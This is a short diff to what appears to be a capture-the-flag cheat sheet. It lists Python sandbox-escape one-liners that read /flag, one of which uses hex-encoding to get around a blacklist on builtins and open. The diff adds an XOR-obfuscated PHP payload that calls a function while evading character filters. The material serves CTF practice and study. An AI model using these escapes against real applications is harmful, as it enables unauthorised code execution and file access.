@@ -54,3 +54,6 @@ Python Sandbox escape - `globals()["__builtins__"].open("/flag").read()`
 Escape while builtins and open is blacklisted - `globals().__getitem__(bytes.fromhex(%275f5f6275696c74696e735f5f%27).decode(%27utf-8%27)).__getitem__(bytes.fromhex(%276f70656e%27).decode(%27utf-8%27))(%22/flag%22,%20%22r%22).read()`
 
 Hashes Ref : https://blog.csdn.net/u013512548/article/details/108213295
+
+PHP calc :
+`("538869"^"~4~2-~"^"8~5~~*")(("378#"^"~(2,"^".~~%"))`
